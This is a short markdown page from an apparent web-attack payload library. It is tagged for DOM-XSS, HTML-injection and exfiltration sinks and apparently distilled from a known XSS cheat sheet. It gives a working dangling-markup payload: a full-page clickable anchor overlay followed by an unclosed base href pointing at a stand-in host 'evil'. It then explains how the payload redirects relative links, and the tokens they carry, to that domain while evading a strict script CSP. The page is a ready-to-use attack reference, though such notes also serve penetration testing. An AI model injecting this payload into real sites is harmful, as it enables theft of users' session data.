---
title: Dangling base href Exfil
slug: dangling-base-href
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-12T00:00:00Z
tags: [payload, sink/dom-xss, sink/html-injection, sink/dangling-markup, sink/exfil]
inbound: []
---

# Dangling base href Exfil

## Payload

```html
<a href=abc style="width:100%;height:100%;position:absolute;font-size:1000px;">xss<base href="//evil/
```

## Context

The `<base href>` tag sets the base URL for all relative links on the page. Injecting a `<base href="//evil/` with an unclosed quote causes the browser to interpret subsequent page content as part of the base href value. Any relative link the user clicks after this injection resolves against the attacker's domain, redirecting navigation there — including links that carry tokens or session data in relative paths. The large styled `<a>` overlay encourages a click. Pure HTML injection, no JavaScript execution. Effective even under strict `script-src` CSP.

## Provenance

- Distilled from: `../../techniques/dom-xss/scriptless-attacks.md`
- Original source: `../../sources/portswigger-xss-cheatsheet.md`

## Linked techniques

- [Scriptless Attacks](../../techniques/dom-xss/scriptless-attacks.md)
- [Dangling Markup Exfil](../../payloads/dom-xss/dangling-markup-exfil.md)
